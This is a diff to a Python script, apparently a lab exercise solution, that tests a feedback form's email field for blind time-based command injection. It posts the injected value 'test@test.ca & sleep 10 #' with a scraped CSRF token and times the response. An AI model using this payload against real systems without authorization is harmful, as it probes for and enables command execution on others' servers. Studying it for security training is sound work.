@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import requests
 import sys
 import urllib3
@@ -5,8 +7,10 @@ from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# Requests go through BurpSuite proxies first.
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
+# Extracting the CSRF Token
 def get_csrf_token(s, url):
     feedback_path = '/feedback'
     r = s.get(url + feedback_path, verify=False, proxies=proxies)
@@ -16,10 +20,12 @@ def get_csrf_token(s, url):
 
 def check_command_injection(s, url):
     submit_feedback_path = '/feedback/submit'
-    command_injection = 'test@test.ca & sleep 10 #'
+    command_injection = 'test@test.ca & sleep 10 #' # <-- using the sleep command
     csrf_token = get_csrf_token(s, url)
+    # Assingning email parameter values
     data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
     res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
+    
     if (res.elapsed.total_seconds() >=10):
         print("(+) Email field vulnerable to time-based command injection!")
     else:
@@ -34,6 +40,7 @@ def main():
     url = sys.argv[1]
     print("(+) Checking if email parameter is vulnerable to time-based command injection...")
 
+    # Session will be obtained by extracting the CSRF Token from the page
     s = requests.Session()
     check_command_injection(s, url)
 
